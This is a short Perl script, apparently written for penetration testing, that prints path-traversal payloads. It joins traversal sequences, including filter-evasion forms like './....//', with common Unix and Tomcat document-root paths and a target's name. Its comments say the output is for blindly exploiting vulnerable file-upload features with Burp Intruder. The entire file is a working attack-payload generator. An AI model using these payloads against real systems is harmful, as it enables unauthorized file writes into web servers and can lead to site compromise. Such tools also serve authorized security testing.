#!/usr/bin/perl

# This little helper script attempts to generate all potential DOCUMENT_ROOT full paths for a given application.
# Such output is intended for use with tools like Burp Intruder in order to blindly exploit vulnerable file upload implementations.
# Coded by ewilded (February 2016)
# The initial list of directories and their suffices was taken from sqlmap

# Please keep in mind to provide relevant configuration below (short and long name of the target, as its DOC_ROOT is highly likely derived from that value)

use strict;

my $target_short='example';
my $target_long='example.org';
my $filename='test.jpg';
my $auto_append_traversals=1;
my $auto_append_filename=1;
my $auto_append_pure_traversals=1;

my @traversals=('',
'./../../../../../../../../',
'./....//....//....//....//....//....//....//....//',
'..//...//...//...//...//...//...//...//...//');

my @pure_traversals=(
'./../',
'./../../',
'./../../../',
'./../../../../',
'./../../../../../',
'./../../../../../../',
'./../../../../../../../',
'./../../../../../../../../',
'./....//....//',
'./....//....//....//',
'./....//....//....//....//',
'./....//....//....//....//....//',
'./....//....//....//....//....//....//',
'./....//....//....//....//....//....//....//',
'./....//....//....//....//....//....//....//....//',
'./...//...//',
'./...//...//...//',
'./...//...//...//...//',
'./...//...//...//...//...//',
'./...//...//...//...//...//...//',
'./...//...//...//...//...//...//...//',
'./...//...//...//...//...//...//...//...//'
);

# nix only
my @brute_doc_root_prefixes=
 (
 "/var/www",
 "/usr/local/apache", 
 "/usr/local/apache2", 
 "/usr/local/www/apache22", 
 "/usr/local/www/apache24", 
 "/usr/local/httpd", 
 "/var/www/nginx-default", 
 "/srv/www", 
 "/var/www/$target_short", 
 "/var/www/vhosts/$target_short", 
 "/var/www/virtual/$target_short", 
 "/var/www/clients/vhosts/$target_short", 
 "/var/www/clients/virtual/$target_short", 
 "/usr/local/tomcat/webapps/$target_short",
 "/usr/local/tomcat01/webapps/$target_short", 
 "/usr/local/tomcat02/webapps/$target_short",
 "/var/www/$target_long", 
 "/var/www/vhosts/$target_long", 
 "/var/www/virtual/$target_long", 
 "/var/www/clients/vhosts/$target_long", 
 "/var/www/clients/virtual/$target_long", 
 "/usr/local/tomcat/webapps/$target_long",
 "/usr/local/tomcat01/webapps/$target_long", 
 "/usr/local/tomcat02/webapps/$target_long",
 );


# Suffixes used in brute force search for web server document root
my @brute_doc_root_suffixes=("", "html", "htdocs", "httpdocs", "php", "public", "src", "site", "build", "web", "data", "sites/all", "www/build",$target_short,$target_long);

foreach my $brute_force_dir_prefix(@brute_doc_root_prefixes)
{
  foreach my $brute_force_dir_suffix(@brute_doc_root_suffixes)
  {
    if($auto_append_traversals eq 1)
	{
		foreach my $traversal(@traversals)
		{
			if($auto_append_filename eq 1)
			{
				print "$traversal$brute_force_dir_prefix/$brute_force_dir_suffix/$filename\n";				
			}
			else
			{
				print "$traversal$brute_force_dir_prefix/$brute_force_dir_suffix\n";				
			}
		}
	}
	else
	{
		print "$brute_force_dir_prefix/$brute_force_dir_suffix\n";
	}
  }
}

if($auto_append_pure_traversals eq 1)
{
	foreach my $pure_traversal(@pure_traversals)
	{
		if($auto_append_filename eq 1)
		{
			print "$pure_traversal/$filename\n";
		}
		else
		{
			print "$pure_traversal\n";
		}
	}
}
print "$filename\n" if($auto_append_filename eq 1);
